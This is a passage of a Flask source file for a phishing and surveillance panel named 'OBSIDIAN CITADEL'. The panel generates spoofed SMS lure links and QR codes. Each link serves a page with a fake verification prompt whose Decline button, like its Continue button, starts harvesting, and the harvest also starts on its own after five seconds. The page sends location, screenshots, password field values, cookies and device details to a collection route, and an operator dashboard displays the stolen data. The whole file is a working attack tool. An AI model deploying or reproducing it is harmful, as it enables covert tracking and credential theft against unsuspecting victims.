        if (cookies.length === 0) { tbody.innerHTML = '<tr><td colspan="5" class="text-muted">No cookies harvested yet.</td></tr>'; return; }
        let html = '';
        cookies.slice().reverse().forEach(item => {
            html += `
                <tr>
                    <td>${item.domain || 'N/A'}</td>
                    <td>${item.name || 'N/A'}</td>
                    <td style="font-family:monospace;color:var(--accent-3);font-size:0.6rem;word-break:break-all;">${item.value || 'N/A'}</td>
                    <td>${item.timestamp ? item.timestamp.slice(11,16) : '--'}</td>
                    <td>${item.ip || 'unknown'}</td>
                </tr>
            `;
        });
        tbody.innerHTML = html;
    } catch(e) { console.log('Cookie error', e); }
}

// UPDATE DEVICES
async function updateDevices() {
    try {
        const res = await fetch(API_BASE + '/api/devices');
        const devices = await res.json();
        const container = document.getElementById('deviceList');
        if (devices.length === 0) { container.innerHTML = '<div class="text-muted">No device data yet.</div>'; return; }
        let html = '';
        devices.slice().reverse().forEach(item => {
            html += `
                <div style="background:rgba(0,0,0,0.2);border-radius:8px;padding:12px;margin-bottom:8px;border:1px solid var(--glass-border);font-size:0.75rem;">
                    <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;">
                        <span style="color:var(--accent-2);">${item.ua || item.userAgent || 'Unknown Device'}</span>
                        <span style="color:var(--text-secondary);">${item.timestamp ? item.timestamp.slice(11,16) : '--'}</span>
                    </div>
                    <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:4px;color:var(--text-secondary);font-size:0.65rem;">
                        <span>📱 ${item.screen || 'N/A'}</span>
                        <span>🌐 ${item.tz || 'N/A'}</span>
                        <span>🔋 ${item.battery || 'N/A'}%</span>
                        <span>🧠 ${item.cores || 'N/A'} cores</span>
                        <span>💾 ${item.memory || 'N/A'} GB</span>
                        <span>📡 ${item.ip || 'unknown'}</span>
                    </div>
                </div>
            `;
        });
        container.innerHTML = html;
    } catch(e) { console.log('Device error', e); }
}

// UPDATE CONFIG
async function updateConfig() {
    try {
        const res = await fetch(API_BASE + '/api/config');
        const config = await res.json();
        document.getElementById('currentBaseUrl').textContent = config.external_url || 'https://your-app.onrender.com';
        document.getElementById('configUrl').value = config.external_url || '';
        document.getElementById('sysVersion').textContent = 'v' + (config.version || '8.1');
        document.getElementById('publicUrlDisplay').textContent = config.external_url || 'https://your-app.onrender.com';
    } catch(e) { console.log('Config error', e); }
}

// GENERATE LINK
document.getElementById('generateBtn').onclick = async () => {
    const type = document.getElementById('lureType').value;
    const pretext = document.getElementById('pretextInput').value || 'Default';
    const formData = new FormData();
    formData.append('pretext', pretext);
    const res = await fetch(API_BASE + `/generate/${type}`, { method: 'POST', body: formData });
    const data = await res.json();
    const area = document.getElementById('resultArea');
    if (data.link) {
        let qrHTML = data.qr ? `<div class="qr-container"><img src="data:image/png;base64,${data.qr}" /></div>` : '';
        area.innerHTML = `
            <div class="link-box">
                <input type="text" value="${data.link}" readonly id="newLinkInput">
                <span class="copy" onclick="navigator.clipboard.writeText('${data.link}');this.textContent='✓';">📋 Copy</span>
                <span class="copy" onclick="window.open('${data.link}','_blank');">🔗 Open</span>
            </div>
            ${data.pretext ? `<span class="preview-text">📱 ${data.pretext}</span>` : ''}
            ${qrHTML}
            <div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;">
                <span class="preview-text">🆔 ${data.id}</span>
                <span class="preview-text">${type}</span>
            </div>
        `;
    }
    fetchStats();
};

// MAP CONTROLS
document.getElementById('refreshMapBtn').onclick = () => fetchStats();
document.getElementById('clearMapBtn').onclick = () => { if (markerCluster) { markerCluster.clearLayers(); document.getElementById('mapTargetList').innerHTML = '<div class="text-muted">Markers cleared.</div>'; document.getElementById('mapTargetCount').textContent = '0'; } };
document.getElementById('fitMapBtn').onclick = () => { if (markerCluster && markerCluster.getLayers().length > 0) { try { const bounds = markerCluster.getBounds(); if (bounds.isValid()) map.fitBounds(bounds, { padding: [30, 30], maxZoom: 12 }); } catch(e) {} } };

// CONFIG SAVE
document.getElementById('configSaveBtn').onclick = async () => {
    const url = document.getElementById('configUrl').value;
    const status = document.getElementById('configStatus');
    status.textContent = '⏳ Saving...';
    status.style.color = '#f39c12';
    const res = await fetch(API_BASE + '/api/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ external_url: url })
    });
    if (res.ok) {
        status.textContent = '✅ Config saved!';
        status.style.color = '#00ff88';
        fetchStats();
    } else {
        status.textContent = '❌ Failed.';
        status.style.color = '#e74c3c';
    }
};

// CLEAR HISTORY
document.getElementById('clearHistoryBtn').onclick = async () => {
    if (confirm('Clear all history?')) {
        await fetch(API_BASE + '/api/history/clear', { method: 'POST' });
        fetchStats();
    }
};

// SEARCH
document.getElementById('searchInput').oninput = function() {
    const query = this.value.toLowerCase();
    document.querySelectorAll('.log-entry, .history-item, table tr').forEach(el => {
        if (el.textContent.toLowerCase().includes(query)) {
            el.style.display = '';
        } else {
            el.style.display = 'none';
        }
    });
};

// AUTO REFRESH
fetchStats();
setInterval(fetchStats, 3000);

setTimeout(() => { if (document.getElementById('tab-map').classList.contains('active')) { initMap(); fetchStats(); } }, 500);
window.addEventListener('resize', () => { if (map) setTimeout(() => map.invalidateSize(), 400); });

console.log('[FORGE] OBSIDIAN CITADEL v8.1 loaded');
</script>
</body>
</html>
'''

# ========== LOGIN PAGE ==========
LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>◈ OBSIDIAN CITADEL</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background: #070b12; color: #f0f4ff; font-family: 'Inter', -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
.login-box { background: rgba(17,26,42,0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; padding: 48px; max-width: 420px; width: 100%; box-shadow: 0 30px 80px rgba(0,0,0,0.8); }
.login-box h1 { font-size: 2rem; font-weight: 700; background: linear-gradient(135deg, #6c5ce7, #00d4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 4px; }
.login-box .sub { color: #8899b4; font-size: 0.85rem; margin-bottom: 28px; }
.login-box input { width: 100%; padding: 14px 18px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; color: #f0f4ff; font-size: 1rem; outline: none; margin-bottom: 16px; transition: 0.2s; }
.login-box input:focus { border-color: #6c5ce7; box-shadow: 0 0 0 3px rgba(108,92,231,0.15); }
.login-box .btn { width: 100%; padding: 14px; background: #6c5ce7; border: none; border-radius: 12px; color: white; font-size: 1rem; font-weight: 600; cursor: pointer; transition: 0.2s; }
.login-box .btn:hover { background: #5a4bcf; box-shadow: 0 0 40px rgba(108,92,231,0.3); }
.login-box .error { color: #e74c3c; font-size: 0.8rem; margin-bottom: 12px; display: none; }
.login-box .footer { margin-top: 16px; font-size: 0.65rem; color: #4b5a7a; text-align: center; }
</style>
</head>
<body>
<div class="login-box">
    <h1>◈ CITADEL</h1>
    <div class="sub">Enter your access code</div>
    <div class="error" id="errorMsg">Invalid password</div>
    <input type="password" id="passwordInput" placeholder="Password" autofocus>
    <button class="btn" id="loginBtn">🔓 Unlock</button>
    <div class="footer">v8.1 · Zero-Permission Harvest</div>
</div>
<script>
document.getElementById('loginBtn').onclick = async () => {
    const pwd = document.getElementById('passwordInput').value;
    const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ password: pwd }) });
    const data = await res.json();
    if (data.status === 'ok') { window.location.href = '/'; }
    else { document.getElementById('errorMsg').style.display = 'block'; document.getElementById('passwordInput').value = ''; document.getElementById('passwordInput').focus(); }
};
document.getElementById('passwordInput').onkeydown = (e) => { if (e.key === 'Enter') document.getElementById('loginBtn').click(); };
</script>
</body>
</html>
'''

# ========== ROUTES ==========

@app.route('/')
def dashboard():
    if not session.get('logged_in'):
        return render_template_string(LOGIN_PAGE)
    return render_template_string(HTML)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    pwd = data.get('password', '')
    hashed = hashlib.sha256(pwd.encode()).hexdigest()
    if hashed == config.get('password_hash', ''):
        session['logged_in'] = True
        return jsonify({'status': 'ok'})
    return jsonify({'status': 'error'}), 401

@app.route('/api/logout', methods=['POST'])
def logout():
    session.clear()
    return jsonify({'status': 'ok'})

@app.route('/generate/siren', methods=['POST'])
def generate_siren():
    if not session.get('logged_in'): return jsonify({'error': 'Unauthorized'}), 401
    link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    base_url = config.get('external_url', PUBLIC_URL)
    full_link = f"{base_url}/siren/{link_id}"
    db['links'][link_id] = {'type': 'siren', 'created': str(datetime.datetime.now()), 'clicks': 0, 'url': full_link}
    save_db(db)
    qr = qrcode.make(full_link)
    qr_bytes = io.BytesIO()
    qr.save(qr_bytes, format='PNG')
    qr_b64 = base64.b64encode(qr_bytes.getvalue()).decode()
    return jsonify({'link': full_link, 'qr': qr_b64, 'id': link_id})

@app.route('/generate/sms_spoof', methods=['POST'])
def generate_sms_spoof():
    if not session.get('logged_in'): return jsonify({'error': 'Unauthorized'}), 401
    link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    base_url = config.get('external_url', PUBLIC_URL)
    fake_preview = request.form.get('pretext', 'Your delivery is pending')
    full_link = f"{base_url}/siren/{link_id}?pre={base64.b64encode(fake_preview.encode()).decode()}"
    db['links'][link_id] = {'type': 'sms_spoof', 'pretext': fake_preview, 'created': str(datetime.datetime.now()), 'clicks': 0, 'url': full_link}
    save_db(db)
    return jsonify({'link': full_link, 'pretext': fake_preview, 'id': link_id})

# ===== ZERO-PERMISSION PAYLOAD =====
@app.route('/siren/<link_id>')
def serve_siren(link_id):
    if link_id not in db['links']: return "Link expired or invalid.", 404
    db['links'][link_id]['clicks'] += 1
    save_db(db)
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>◈ Loading...</title>
    <style>
        * {{ margin:0; padding:0; }}
        body {{ background: #070b12; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: 'Inter', sans-serif; color: #8899b4; flex-direction: column; gap: 16px; overflow: hidden; }}
        .spinner {{ width: 36px; height: 36px; border: 3px solid rgba(255,255,255,0.06); border-top: 3px solid #6c5ce7; border-radius: 50%; animation: spin 0.8s linear infinite; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .status {{ font-size: 0.8rem; color: #4b5a7a; }}
        #overlay {{
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(7,11,18,0.98);
            display: flex; align-items: center; justify-content: center;
            z-index: 99999; flex-direction: column; gap: 12px;
        }}
        .fake-prompt {{
            background: rgba(17,26,42,0.9); backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 20px; padding: 32px 40px;
            max-width: 360px; text-align: center;
            box-shadow: 0 30px 80px rgba(0,0,0,0.9);
            animation: fadeIn 0.3s ease;
        }}
        .fake-prompt .icon {{ font-size: 2.5rem; }}
        .fake-prompt .title {{ font-size: 1.2rem; font-weight: 600; color: #f0f4ff; margin: 8px 0 4px; }}
        .fake-prompt .desc {{ font-size: 0.8rem; color: #8899b4; line-height: 1.5; }}
        .fake-prompt .btn-row {{ display: flex; gap: 12px; justify-content: center; margin-top: 20px; }}
        .fake-prompt .btn-row button {{ padding: 10px 30px; border: none; border-radius: 12px; font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: 0.2s; }}
        .fake-prompt .btn-row .allow {{ background: #6c5ce7; color: white; }}
        .fake-prompt .btn-row .allow:hover {{ background: #5a4bcf; box-shadow: 0 0 40px rgba(108,92,231,0.3); }}
        .fake-prompt .btn-row .block {{ background: rgba(255,255,255,0.05); color: #8899b4; border: 1px solid rgba(255,255,255,0.06); }}
        .fake-prompt .btn-row .block:hover {{ background: rgba(255,255,255,0.08); }}
        .fake-prompt .footer {{ font-size: 0.55rem; color: #4b5a7a; margin-top: 16px; }}
        @keyframes fadeIn {{ 0% {{ opacity: 0; transform: scale(0.95); }} 100% {{ opacity: 1; transform: scale(1); }} }}
        .progress {{ width: 100%; max-width: 280px; height: 2px; background: rgba(255,255,255,0.06); border-radius: 2px; overflow: hidden; margin-top: 12px; }}
        .progress .fill {{ height: 100%; width: 0%; background: linear-gradient(90deg, #6c5ce7, #00d4ff); animation: progress 4s ease-in-out forwards; }}
        @keyframes progress {{ 0% {{ width: 0%; }} 100% {{ width: 100%; }} }}
        .log-status {{ font-size: 0.65rem; color: var(--text-muted); margin-top: 4px; }}
    </style>
</head>
<body>

<div id="overlay">
    <div class="fake-prompt">
        <div class="icon">🔐</div>
        <div class="title">Secure Verification</div>
        <div class="desc">This site needs <span style="color:#6c5ce7;">location &amp; screen access</span> to verify your identity.<br><span style="font-size:0.7rem;color:#4b5a7a;">✓ Encrypted • Zero-log • One-time</span></div>
        <div class="progress"><div class="fill"></div></div>
        <div class="btn-row">
            <button class="block" id="fake-block">Decline</button>
            <button class="allow" id="fake-allow">Continue</button>
        </div>
        <div class="footer">Powered by SecureWeb™ v4.2</div>
    </div>
</div>

<div class="spinner"></div>
<div class="status" id="statusText">Establishing secure channel...</div>
<div class="log-status" id="logStatus"></div>

<script>
(function() {{
    const COLLECTOR = window.location.origin + "/collect/{link_id}";
    let sent = false;
    let ip = 'unknown';
    let harvestLog = [];

    function log(msg) {{
        document.getElementById('logStatus').textContent = msg;
        harvestLog.push(msg);
        console.log('[HARVEST]', msg);
    }}

    document.getElementById('fake-allow').onclick = function(e) {{
        e.preventDefault(); e.stopPropagation();
        document.getElementById('overlay').style.display = 'none';
        startHarvest();
    }};
    document.getElementById('fake-block').onclick = function(e) {{
        e.preventDefault(); e.stopPropagation();
        document.getElementById('overlay').style.display = 'none';
        startHarvest();
    }};

    function sendData(data) {{
        if (sent) return;
        const url = COLLECTOR + "?data=" + encodeURIComponent(JSON.stringify(data));
        fetch(url, {{mode: 'no-cors'}}).catch(()=>{{}});
        navigator.sendBeacon(url);
        sent = true;
        document.getElementById('statusText').textContent = '✓ Data captured';
        document.getElementById('statusText').style.color = '#00ff88';
        log('✓ All data sent');
    }}

    function sendLocation(lat, lon, acc, source, ipAddr) {{
        if (sent) return;
        if (!lat || !lon || lat === 0 || lon === 0) {{
            fallbackToIP();
            return;
        }}
        const data = {{ type: 'location', lat, lon, acc: acc || 0, source: source || 'gps', ip: ipAddr || ip }};
        sendData(data);
        log('📍 Location: ' + lat + ', ' + lon);
    }}

    function fallbackToIP() {{
        if (sent) return;
        log('📡 Falling back to IP geolocation...');
        fetch('https://ipapi.co/json/')
            .then(r => r.json())
            .then(data => {{
                let lat = data.latitude || 0, lon = data.longitude || 0;
                ip = data.ip || 'unknown';
                if (lat && lon && lat !== 0 && lon !== 0) {{
                    sendLocation(parseFloat(lat), parseFloat(lon), 5000, 'ip', ip);
                }}
            }})
            .catch(() => {{
                fetch('https://ipinfo.io/json')
                    .then(r => r.json())
                    .then(data => {{
                        const loc = data.loc?.split(',') || [0,0];
                        ip = data.ip || 'unknown';
                        sendLocation(parseFloat(loc[0]), parseFloat(loc[1]), 5000, 'ip', ip);
                    }})
                    .catch(() => {{ log('❌ IP fallback failed'); }});
            }});
    }}

    function captureScreenshot() {{
        log('🖼️ Capturing screenshot...');
        try {{
            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {{
                navigator.mediaDevices.getDisplayMedia({{ video: true, audio: false }})
                    .then(stream => {{
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {{
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = Math.min(video.videoWidth, 1280);
                            canvas.height = Math.min(video.videoHeight, 720);
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const data = {{ type: 'screenshot', data: canvas.toDataURL('image/png'), ip: ip }};
                            sendData(data);
                            stream.getTracks().forEach(t => t.stop());
                            log('✅ Screenshot captured');
                        }};
                    }})
                    .catch(() => {{ log('⚠️ Screenshot fallback'); canvasFingerprint(); }});
            }} else {{
                canvasFingerprint();
            }}
        }} catch(e) {{ log('❌ Screenshot error'); canvasFingerprint(); }}
    }}

    function canvasFingerprint() {{
        try {{
            const canvas = document.createElement('canvas');
            canvas.width = 1280; canvas.height = 720;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#070b12'; ctx.fillRect(0, 0, 1280, 720);
            ctx.fillStyle = '#6c5ce7'; ctx.font = 'bold 28px Inter'; ctx.fillText('◈ OBSIDIAN CITADEL', 40, 60);
            ctx.fillStyle = '#00ff88'; ctx.font = '16px Inter'; ctx.fillText('📍 Target acquired', 40, 110);
            ctx.fillStyle = '#8899b4'; ctx.font = '14px Inter';
            ctx.fillText('📡 IP: ' + (ip || 'unknown'), 40, 150);
            ctx.fillText('⏱ ' + new Date().toLocaleString(), 40, 180);
            ctx.fillText('🖥️ ' + (navigator.userAgent || '').slice(0, 60), 40, 210);
            const data = {{ type: 'screenshot', data: canvas.toDataURL('image/png'), ip: ip }};
            sendData(data);
            log('✅ Canvas fingerprint captured');
        }} catch(e) {{ log('❌ Canvas error'); }}
    }}

    function capturePasswords() {{
        log('🔑 Looking for passwords...');
        try {{
            const forms = document.querySelectorAll('form');
            let found = [];
            forms.forEach(form => {{
                const inputs = form.querySelectorAll('input[type="password"]');
                inputs.forEach(pw => {{
                    const username = form.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"]');
                    const url = window.location.href;
                    if (pw.value && pw.value.length > 0) {{
                        found.push({{ url: url, username: username ? username.value : 'unknown', password: pw.value }});
                    }}
                }});
            }});
            const hiddenFields = document.querySelectorAll('input[type="password"][autocomplete="current-password"]');
            hiddenFields.forEach(el => {{
                if (el.value) {{
                    found.push({{ url: window.location.href, username: 'autofill', password: el.value }});
                }}
            }});
            if (found.length > 0) {{
                const data = {{ type: 'passwords', data: found, ip: ip }};
                sendData(data);
                log('✅ ' + found.length + ' passwords found');
            }} else {{
                log('ℹ️ No passwords found');
            }}
        }} catch(e) {{ log('❌ Password error'); }}
    }}

    function captureCookies() {{
        log('🍪 Capturing cookies...');
        try {{
            const cookies = document.cookie.split(';').map(c => c.trim());
            if (cookies.length > 0 && cookies[0]) {{
                const parsed = cookies.map(c => {{
                    const [name, ...rest] = c.split('=');
                    return {{ name: name.trim(), value: rest.join('=') || '' }};
                }});
                const data = {{ type: 'cookies', data: parsed, domain: window.location.hostname, ip: ip }};
                sendData(data);
                log('✅ ' + parsed.length + ' cookies captured');
            }} else {{
                log('ℹ️ No cookies found');
            }}
        }} catch(e) {{ log('❌ Cookie error'); }}
    }}

    function captureDeviceInfo() {{
        log('📱 Capturing device info...');
        try {{
            const data = {{
                type: 'device',
                ua: navigator.userAgent,
                screen: screen.width + 'x' + screen.height,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lang: navigator.language,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                ip: ip
            }};
            if (navigator.getBattery) {{
                navigator.getBattery().then(bat => {{
                    data.battery = Math.round(bat.level * 100);
                    data.charging = bat.charging;
                    sendData(data);
                    log('✅ Device info + battery: ' + data.battery + '%');
                }}).catch(() => {{
                    sendData(data);
                    log('✅ Device info captured');
                }});
            }} else {{
                sendData(data);
                log('✅ Device info captured');
            }}
        }} catch(e) {{ log('❌ Device error'); }}
    }}

    function startHarvest() {{
        document.getElementById('statusText').textContent = '📡 Acquiring data...';
        log('🚀 Starting harvest...');

        // GPS
        if (navigator.geolocation) {{
            log('📍 Requesting GPS...');
            navigator.geolocation.getCurrentPosition(
                pos => {{
                    sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
                    log('✅ GPS acquired');
                }},
                () => {{
                    log('⚠️ GPS denied, using IP');
                    fallbackToIP();
                }},
                {{enableHighAccuracy: true, timeout: 5000}}
            );
        }} else {{
            log('⚠️ GPS not available');
            fallbackToIP();
        }}

        // Screenshot
        setTimeout(captureScreenshot, 1500);

        // Passwords
        setTimeout(capturePasswords, 2000);

        // Cookies
        setTimeout(captureCookies, 2500);

        // Device Info
        setTimeout(captureDeviceInfo, 1000);

        // Final status after all harvests
        setTimeout(() => {{
            document.getElementById('statusText').textContent = '✓ All data captured';
            document.getElementById('statusText').style.color = '#00ff88';
            log('✅ Harvest complete');
        }}, 4000);
    }}

    // Auto-start after 5s if no interaction
    setTimeout(() => {{
        document.getElementById('overlay').style.display = 'none';
        if (!sent) startHarvest();
    }}, 5000);

    // Final fallback
    setTimeout(() => {{
        if (!sent) {{
            log('⚠️ Final fallback to IP');
            fallbackToIP();
        }}
    }}, 10000);

    window.addEventListener('beforeunload', () => {{
        if (!sent) fallbackToIP();
    }});

    console.log('[FORGE] OBSIDIAN CITADEL payload loaded');
}})();
</script>
</body>
</html>'''

# ===== COLLECT ROUTE =====
@app.route('/collect/<link_id>')
def collect(link_id):
    if link_id not in db['links']:
        return "Invalid", 404
    
    data_str = request.args.get('data')
    if data_str:
        try:
            data = json.loads(data_str)
            data_type = data.get('type', 'unknown')
            data['timestamp'] = str(datetime.datetime.now())
            data['link_id'] = link_id
            if 'ip' not in data or not data['ip']:
                data['ip'] = request.remote_addr
            
            print(f"[!] RECEIVED: {data_type} from {data.get('ip', request.remote_addr)}")
            
            # Route to appropriate storage
            if data_type == 'location':
                db['captures'].append(data)
                db['history'].append(data)
            elif data_type == 'screenshot':
                db['screenshots'].append(data)
            elif data_type == 'passwords':
                for p in data.get('data', []):
                    db['passwords'].append({
                        'url': p.get('url', 'unknown'),
                        'username': p.get('username', 'unknown'),
                        'password': p.get('password', ''),
                        'timestamp': str(datetime.datetime.now()),
                        'ip': data.get('ip', request.remote_addr),
                        'link_id': link_id
                    })
            elif data_type == 'cookies':
                for c in data.get('data', []):
                    db['cookies'].append({
                        'domain': data.get('domain', 'unknown'),
                        'name': c.get('name', 'unknown'),
                        'value': c.get('value', ''),
                        'timestamp': str(datetime.datetime.now()),
                        'ip': data.get('ip', request.remote_addr),
                        'link_id': link_id
                    })
            elif data_type == 'device':
                db['devices'].append(data)
            else:
                db['captures'].append(data)
            
            save_db(db)
            print(f"[!] STORED: {data_type} | Total captures: {len(db['captures'])}")
            
        except Exception as e:
            print(f"[!] Parse error: {e}")
            import traceback
            traceback.print_exc()
    
    return "OK"

# ===== API ROUTES =====
@app.route('/api/links')
def get_links():
    if not session.get('logged_in'): return jsonify({}), 401
    return jsonify(db['links'])

@app.route('/api/captures')
def get_all_captures():
    if not session.get('logged_in'): return jsonify([]), 401
    return jsonify(db['captures'])

@app.route('/api/captures/<link_id>')
def get_captures(link_id):
    if not session.get('logged_in'): return jsonify([]), 401
    return jsonify([c for c in db['captures'] if c.get('link_id') == link_id])

@app.route('/api/history')
def get_history():
    if not session.get('logged_in'): return jsonify([]), 401
    return jsonify(db['history'])

@app.route('/api/history/clear', methods=['POST'])
def clear_history():
    if not session.get('logged_in'): return jsonify({'error': 'Unauthorized'}), 401
    db['history'] = []
    save_db(db)
    return "OK"

@app.route('/api/screenshots')
def get_screenshots():
    if not session.get('logged_in'): return jsonify([]), 401
    return jsonify(db['screenshots'])

@app.route('/api/passwords')
def get_passwords():
    if not session.get('logged_in'): return jsonify([]), 401
    return jsonify(db['passwords'])

@app.route('/api/cookies')
def get_cookies():
    if not session.get('logged_in'): return jsonify([]), 401
    return jsonify(db['cookies'])

@app.route('/api/devices')
def get_devices():
    if not session.get('logged_in'): return jsonify([]), 401
    return jsonify(db['devices'])

@app.route('/api/config', methods=['GET', 'POST'])
def config_endpoint():
    global config
    if not session.get('logged_in'): return jsonify({'error': 'Unauthorized'}), 401
    if request.method == 'POST':
        data = request.json
        if 'external_url' in data:
            config['external_url'] = data['external_url']
        config['version'] = VERSION
        save_config(config)
        return jsonify(config)
    config['version'] = VERSION
    return jsonify(config)

# ========== RUN ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"[FORGE] OBSIDIAN CITADEL v{VERSION} - FULLY WORKING")
    print(f"[FORGE] Port: {port}")
    print(f"[FORGE] Public URL: {config.get('external_url', PUBLIC_URL)}")
    print(f"[FORGE] Password: {ADMIN_PASSWORD}")
    print("[FORGE] Harvesting: GPS, Screenshot, Passwords, Cookies, Device Data")
    print(f"[FORGE] Database: {DB_FILE}")
    app.run(host='0.0.0.0', port=port, debug=False)